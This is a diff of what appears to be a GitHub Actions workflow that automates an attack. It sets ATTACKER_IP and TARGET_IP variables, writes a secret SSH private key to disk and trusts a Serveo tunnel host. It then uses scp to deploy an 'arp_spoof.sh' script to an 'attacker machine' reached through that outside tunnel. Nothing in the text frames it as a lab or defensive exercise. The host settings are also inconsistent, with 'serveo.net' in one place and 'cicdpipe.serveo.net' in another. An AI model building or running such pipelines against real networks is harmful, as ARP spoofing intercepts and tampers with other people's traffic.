@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     
     env:
-      ATTACKER_IP: cicdpipe.serveo.net  # Serveo URL for SSH
+      ATTACKER_IP: serveo.net  # Serveo URL for SSH
       TARGET_IP: ${{ secrets.TARGET_IP }}
       ATTACKER_PORT: 8080  # Port for Serveo
       SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
@@ -26,12 +26,20 @@ jobs:
           echo "Attacker IP: ${{ secrets.ATTACKER_IP }}"
           echo "Target IP: ${{ secrets.TARGET_IP }}"
 
+      - name: Check if attacker machine is reachable
+        run: |
+          ping -c 4 $ATTACKER_IP
+
       - name: Set up SSH key
         run: |
           mkdir -p ~/.ssh
           echo "$SSH_PRIVATE_KEY" > ~/.ssh/id_rsa
           chmod 600 ~/.ssh/id_rsa
-          
+
+      - name: Add Serveo host key to known_hosts
+        run: |
+          ssh-keyscan -H cicdpipe.serveo.net >> ~/.ssh/known_hosts
+
       - name: Deploy attack script to attacker machine
         run: |
           scp -P $ATTACKER_PORT -v arp_spoof.sh rb@$ATTACKER_IP:/home/rb/
